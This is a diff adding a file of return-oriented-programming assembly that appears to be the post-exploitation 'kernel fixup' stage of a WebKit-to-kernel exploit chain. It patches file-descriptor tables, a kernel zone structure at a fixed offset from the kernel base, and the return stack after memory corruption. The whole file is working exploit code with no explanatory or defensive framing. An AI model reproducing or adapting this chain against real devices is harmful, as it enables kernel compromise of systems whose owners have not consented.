@@ -1,0 +1,203 @@
+fix_fd:
+shl rax, 3
+pop rsi
+dp cur_fd
+mov [rsi], rax ; mov al, 1
+mov rax, r8
+pop rcx
+cur_fd:
+dq 0
+add rax, rcx
+mov rax, [rax]
+mov rax, [rax]
+pop rcx
+dq 74*4
+add rax, rcx
+mov qword [rax], 0
+pop rcx
+dq 9*4
+add rax, rcx
+mov dword [rax], 0
+pop rcx
+dq 2*4
+add rax, rcx
+mov dword [rax], 0
+pop rcx
+dq -11*4-74*4+136*4
+add rax, rcx
+mov qword [rax], 0
+pop rcx
+dq 9*4
+add rax, rcx
+mov dword [rax], 0
+pop rcx
+dq 2*4
+add rax, rcx
+mov dword [rax], 0
+pop rsp
+fixup_ret:
+dq 0
+
+#rdi = bad_fds
+#r8 = fd_ofiles
+_kernel_fixup:
+# fix fds
+pop rax
+dp ret1
+pop rsi
+dp fixup_ret
+mov [rsi], rax ; mov al, 1
+mov eax, [rdi]
+pop rsi
+dq -4
+sub rdi, rsi ; mov rdx, rdi
+pop rsp
+dp fix_fd
+ret1:
+pop rax
+dp ret2
+pop rsi
+dp fixup_ret
+mov [rsi], rax ; mov al, 1
+mov eax, [rdi]
+pop rsi
+dq -4
+sub rdi, rsi ; mov rdx, rdi
+pop rsp
+dp fix_fd
+ret2:
+pop rax
+dp ret3
+pop rsi
+dp fixup_ret
+mov [rsi], rax ; mov al, 1
+mov eax, [rdi]
+pop rsi
+dq -4
+sub rdi, rsi ; mov rdx, rdi
+pop rsp
+dp fix_fd
+ret3:
+pop rax
+dp ret4
+pop rsi
+dp fixup_ret
+mov [rsi], rax ; mov al, 1
+mov eax, [rdi]
+pop rsi
+dq -4
+sub rdi, rsi ; mov rdx, rdi
+pop rsp
+dp fix_fd
+ret4:
+pop rax
+dp ret5
+pop rsi
+dp fixup_ret
+mov [rsi], rax ; mov al, 1
+mov eax, [rdi]
+pop rsi
+dq -4
+sub rdi, rsi ; mov rdx, rdi
+pop rsp
+dp fix_fd
+ret5:
+pop rax
+dp ret6
+pop rsi
+dp fixup_ret
+mov [rsi], rax ; mov al, 1
+mov eax, [rdi]
+pop rsi
+dq -4
+sub rdi, rsi ; mov rdx, rdi
+pop rsp
+dp fix_fd
+ret6:
+#pop rax
+#dp ret7
+#pop rsi
+#dp fixup_ret
+#mov [rsi], rax ; mov al, 1
+#mov eax, [rdi]
+#pop rsi
+#dq -4
+#sub rdi, rsi ; mov rdx, rdi
+#pop rsp
+#dp fix_fd
+#ret7:
+
+#fix fucked up fd
+mov eax, [rdi]
+shl rax, 3
+pop rsi
+dp fuckup_fd
+mov [rsi], rax ; mov al, 1
+mov rax, r8
+pop rcx
+fuckup_fd:
+dq 0
+add rax, rcx
+pop rcx
+_kp_decref_fp:
+dq 0
+mov [rax], rcx
+
+#fix zone_pack
+pop rax
+_kp_kernel_base:
+dq 0
+pop rcx
+dq 0x1b45a28
+add rax, rcx
+mov rax, [rax]
+#pop rsi
+#dq 256
+#add rax, rsi
+#pop rsi
+#dq 120
+#pop rcx
+#dq 8
+#mov qword [rax], 0
+#add rax, rcx
+#mov qword [rax], 0
+#add rax, rsi
+#mov qword [rax], 0
+#add rax, rcx
+#mov qword [rax], 0
+#add rax, rsi
+#mov qword [rax], 0
+#add rax, rcx
+#mov qword [rax], 0
+#add rax, rsi
+#mov qword [rax], 0
+#add rax, rcx
+#mov qword [rax], 0
+#add rax, rsi
+#mov qword [rax], 0
+#add rax, rcx
+#mov qword [rax], 0
+#add rax, rsi
+#mov qword [rax], 0
+#add rax, rcx
+#mov qword [rax], 0
+#add rax, rsi
+#mov qword [rax], 0
+#add rax, rcx
+#mov qword [rax], 0
+#add rax, rsi
+#mov qword [rax], 0
+#add rax, rcx
+#mov qword [rax], 0
+pop rsi
+dq 1024
+add rax, rsi
+mov qword [rax], 0
+pop rcx
+dq 8
+add rax, rcx
+mov qword [rax], 0
+#$webkit_base + 0x6410 # cli hlt
+pop rsp
+_kernel_fixup_ret:
+dq 0
